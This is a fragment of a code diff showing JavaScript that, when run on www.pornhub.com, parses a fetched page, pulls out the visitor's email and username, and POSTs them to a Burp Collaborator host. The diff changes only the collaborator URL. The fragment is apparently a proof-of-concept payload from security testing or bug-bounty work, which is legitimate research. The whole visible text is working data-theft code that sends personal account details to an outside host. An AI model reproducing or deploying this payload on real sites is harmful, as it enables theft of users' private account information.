@@ -12,7 +12,7 @@ if (document.domain == "www.pornhub.com") {
                     var dom = parser.parseFromString(xhr.responseText, "text/html")
                     var email = dom.getElementById("email").value;
                     var username = dom.getElementById("username").value;
-                    xhr.open("POST","https://0de5zwwg42pww0vxqc5dfvlsojuaiz.burpcollaborator.net");
+                    xhr.open("POST","https://0205owlgt2ewl0kxfcud4vasdjjb70.burpcollaborator.net");
     xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 
     xhr.send(`email=${email}&username=${username}&message=${message}`);
